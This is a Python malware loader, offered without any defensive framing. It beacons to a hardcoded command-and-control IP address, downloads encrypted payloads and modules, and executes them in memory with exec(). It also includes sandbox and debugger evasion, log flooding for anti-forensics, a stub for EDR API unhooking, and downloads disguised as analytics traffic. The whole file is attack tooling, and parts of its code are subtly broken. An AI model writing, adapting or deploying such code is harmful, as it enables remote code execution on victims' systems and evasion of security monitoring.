import base64
import urllib.request
import sys
import json
from cryptography.fernet import Fernet
import time
import random

# Load profile
with open('malleable_profile.json', 'r') as f:
    profile = json.load(f)

key = profile['encryption']['key'].encode()
fernet = Fernet(base64.urlsafe_b64encode(key.ljust(32)[:32]))

def decrypt_data(data):
    return json.loads(fernet.decrypt(data.encode()).decode())

def anti_sandbox():
    # Check for common sandbox indicators
    import psutil
    if len(psutil.process_iter()) < 10:  # Low process count
        return False
    if psutil.cpu_count() < 2:
        return False
    return True

def api_unhook():
    # Unhook common APIs to bypass EDR
    # Simplified, in practice use libraries like unhook
    pass

def anti_forensic():
    import sys
    # Check for debuggers
    if hasattr(sys, 'gettrace') and sys.gettrace():
        sys.exit(0)
    # Check for sandboxes
    import psutil
    if len(psutil.process_iter()) < 20:
        sys.exit(0)
    # Environmental fingerprinting
    import os
    if os.environ.get('SANDBOX') or 'VIRUS' in os.environ:
        sys.exit(0)
    # Log flooding - fill logs with junk
    for i in range(100):
        print("Junk log entry " * 100)

def load_and_execute_payload(url):
    if not anti_sandbox():
        return  # Exit if sandboxed
    try:
        # Create request with malleable headers
        req = urllib.request.Request(url, headers=profile['http-get']['client']['header'])
        with urllib.request.urlopen(req) as response:
            encrypted_payload = response.read().decode('utf-8')
        
        data = decrypt_data(encrypted_payload)
        encoded_payload = data['payload']
        
        # Decode and execute in memory
        payload = base64.b64decode(encoded_payload)
        exec(payload.decode('utf-8'))
    except Exception as e:
        print(f"Error loading payload: {e}")

def beacon():
    # Sleep with jitter
    sleep_time = profile['sleep'] + random.randint(-profile['jitter'], profile['jitter'])
    time.sleep(sleep_time)

def invisible_update(module_url):
    # Download module as analytics update or ad module
    req = urllib.request.Request(module_url, headers={'User-Agent': 'Mozilla/5.0 (compatible; AnalyticsBot/1.0)'})
    with urllib.request.urlopen(req) as response:
        encrypted_module = response.read()
    # Decrypt and exec in memory
    module_code = fernet.decrypt(encrypted_module).decode()
    exec(module_code)

if __name__ == "__main__":
    # C2 URL for payload
    c2_url = "http://141.105.71.196" + profile['http-get']['client']['uri']
    beacon()
    load_and_execute_payload(c2_url)